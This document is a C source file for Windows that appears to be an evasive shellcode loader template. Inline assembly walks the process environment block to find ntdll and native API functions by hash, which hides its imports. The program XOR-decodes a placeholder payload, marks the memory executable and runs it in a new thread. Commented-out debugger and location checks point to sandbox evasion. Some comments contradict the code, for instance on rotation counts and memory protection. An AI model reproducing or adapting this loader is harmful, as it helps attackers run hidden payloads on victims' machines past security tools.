#include <windows.h>
#include <stdio.h>

#define TRUE 1
#define FALSE 0

typedef NTSYSAPI NTSTATUS (NTAPI* NtAllocVirtMem)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSYSAPI NTSTATUS(NTAPI* NtWriteVirtMem)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten
);

typedef NTSYSAPI NTSTATUS(NTAPI* NtProtectVirtMem)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection
);

typedef NTSYSAPI NTSTATUS(NTAPI* NtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PCRYPT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    ULONG_PTR ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

typedef NTSYSAPI NTSTATUS(NTAPI* NtWaitForSingleObj)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
);


HMODULE CustomGetModuleHandle(unsigned int module_hash) {
    #ifdef _WIN64
        void* module_base = NULL;
        __asm__ (
            // Initialize r10d with hash and set up PEB access
            "movl %[hash], %%r10d\n\t"  
            "xor %%rdx, %%rdx\n\t"
            "mov %%gs:0x60, %%rdx\n\t"
            "mov 0x18(%%rdx), %%rdx\n\t"
            "mov 0x20(%%rdx), %%rdx\n\t"
        "load_module_name:\n\t"
            "mov 0x50(%%rdx), %%rsi\n\t"      // FullDllName.Buffer
            "movzwq 0x4A(%%rdx), %%rcx\n\t"   // Length (16-bit to 64-bit)
            "xor %%r9d, %%r9d\n\t"            // Clear hash accumulator
        "module_hash_loop:\n\t"
            "xor %%rax, %%rax\n\t"
            "lodsb\n\t"                       // Load byte into AL
            "cmp $0x61, %%al\n\t"             // Compare with 'a'
            "jl skip_case_adjustment\n\t"
            "sub $0x20, %%al\n\t"             // Convert to uppercase
        "skip_case_adjustment:\n\t"
            "rol $17, %%r9d\n\t"              // Rotate left by 13 bits
            "add %%eax, %%r9d\n\t"            // Add AL to hash
            "loop module_hash_loop\n\t"
        "then:\n\t"
            "cmp %%r10d, %%r9d\n\t"           // Compare hash
            "je found\n\t"                     // If equal, jump to found
        "load_next_module:\n\t"
            "mov (%%rdx), %%rdx\n\t"          // Next module
            "jmp load_module_name\n\t"
        "found:\n\t"
            "mov %%rdx, %[result]\n\t"            // Store result
            : [result] "=r" (module_base)              // Output
            : [hash] "r" (module_hash)                // Input
            : "rax", "rdx", "rsi", "rcx", "r9", "r10", "memory"  // Clobbers
        );
        return module_base;
    #else
        // 32-bit code TODO
        return NULL;
    #endif
}

/*
pour "wcstoul" ROR13
ce prog me donne 62F36C5A
internet         6D8B4C5E
to_analyse.exe   62F36C5A
*/

FARPROC CustomGetProcAdress(IN HMODULE hModule, unsigned int function_hash) {
    if (hModule == NULL) {
        return NULL;
    }
    #ifdef _WIN64
        void* function_base = NULL;
        __asm__ (
            // Initialize r10d with hash and set up PEB access
            "movl %[hash], %%r10d\n\t"  
            "mov %[module], %%rdx\n\t"  
            "mov 0x20(%%rdx), %%rdx\n\t"
            "mov 0x3c(%%rdx), %%eax\n\t"
            "add %%rdx, %%rax\n\t"
            "mov 0x88(%%rax), %%eax\n\t"
            "add %%rdx, %%rax\n\t"
            "mov 0x18(%%rax), %%ecx\n\t"
            "mov 0x20(%%rax), %%r8d\n\t"
            "add %%rdx, %%r8\n\t"
            "push %%rax\n\t"
        "find_function:\n\t"
            "jrcxz final\n\t"
            "xor %%r9d, %%r9d\n\t"            // Clear hash accumulator
            "dec %%rcx\n\t"                   // Decrement number of functions
            "mov (%%r8, %%rcx, 4), %%esi\n\t" // Load function name RVA
            "add %%rdx, %%rsi\n\t"            // Calculate function name VA
        "function_hash_loop:\n\t"
            "xor %%rax, %%rax\n\t"
            "lodsb\n\t"                       // Load byte into AL
            "ror $23, %%r9d\n\t"              // Rotate right by 23 bits
            "add %%eax, %%r9d\n\t"            // Add AL to hash
            "cmp %%ah, %%al\n\t"
            "jnz function_hash_loop\n\t"
        "next:\n\t"
            "cmp %%r10d, %%r9d\n\t"           // Compare hash
            "jnz find_function\n\t"                     // If equal, jump to found
        "final:\n\t"
            "pop %%rax\n\t"
            "mov 0x24(%%rax), %%r8d\n\t"
            "add %%rdx, %%r8\n\t"
            "mov (%%r8, %%rcx, 2), %%cx\n\t"
            "mov 0x1c(%%rax), %%r8d\n\t"
            "add %%rdx, %%r8\n\t"
            "mov (%%r8, %%rcx, 4), %%eax\n\t"
            "add %%rdx, %%rax\n\t"
            "mov %%rax, %[result]\n\t"
            : [result] "=r" (function_base)                      // Output
            : [hash] "r" (function_hash), [module] "r" ((uintptr_t)hModule)                // Input
            : "rax", "rdx", "rsi", "rcx", "r9", "r10", "memory"  // Clobbers
        );
        return function_base;
    #else
        // 32-bit code TODO
        return NULL;
    #endif
}

void main() {



    // ShellExecute(0, "open", "calc.exe", 0, 0, SW_SHOWNORMAL);

    // int is_debugged = d();
    // int size = z();
    // char *hostname = h();
    // char *country = c();
    // printf("is_debugged: %d\n", is_debugged);
    // printf("hostname: %s\n", hostname);
    // printf("size: %d\n", size);
    // printf("country: %s\n", country);
    
    unsigned char payload[] = "%SHELLCODE%";

    SIZE_T regionSize = sizeof(payload);
    PVOID exec = NULL;
    DWORD old_protect = 0;
    HANDLE th;
    BOOL rv;

    unsigned int ndtll_hash = 0x69e00346;   // ROL17
    unsigned int virtual_alloc_hash = 0x96124679; // ROR23
    unsigned int write_memory_hash = 0x92136911; // ROR23
    unsigned int virtual_protect_hash = 0xd62f6483; // ROR23
    unsigned int create_thread_hash = 0xdd007761; // ROR23
    unsigned int wait_for_single_object_hash = 0xde23aac9; // ROR23

    HMODULE hNtdll = CustomGetModuleHandle(ndtll_hash);

    NtAllocVirtMem _NtAlocVirtMem = (NtAllocVirtMem)CustomGetProcAdress(hNtdll, virtual_alloc_hash);
    NtWriteVirtMem _NtWriteVirtMem = (NtWriteVirtMem)CustomGetProcAdress(hNtdll, write_memory_hash);
    NtProtectVirtMem _NtProtectVirtMem = (NtProtectVirtMem)CustomGetProcAdress(hNtdll, virtual_protect_hash);
    NtCreateThreadEx _NtCreateThreadEx = (NtCreateThreadEx)CustomGetProcAdress(hNtdll, create_thread_hash);
    NtWaitForSingleObj _NtWaitForSingleObj = (NtWaitForSingleObj)CustomGetProcAdress(hNtdll, wait_for_single_object_hash);

    
    // Allocating executable memory
    _NtAlocVirtMem((HANDLE)-1, &exec, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    // XORing shellcode
    for (size_t i = 0; i < sizeof(payload); i++) {
        payload[i] ^= %XOR_KEY%;
    }
    
    // Copy shellcode into allocated memory
    _NtWriteVirtMem((HANDLE)-1, exec, payload, sizeof(payload), NULL);

    // Changing memory protection to PAGE_EXECUTE_READ
    _NtProtectVirtMem((HANDLE)-1, &exec, &regionSize, PAGE_EXECUTE_READ, &old_protect);

    // Executing shellcode in a new thread
    _NtCreateThreadEx(&th, GENERIC_ALL, NULL, (HANDLE)-1, exec, NULL, FALSE, (ULONG_PTR)NULL, (SIZE_T)NULL, (SIZE_T)NULL, NULL);

    // Waiting for thread to finish
    _NtWaitForSingleObj(th, FALSE, NULL);
}

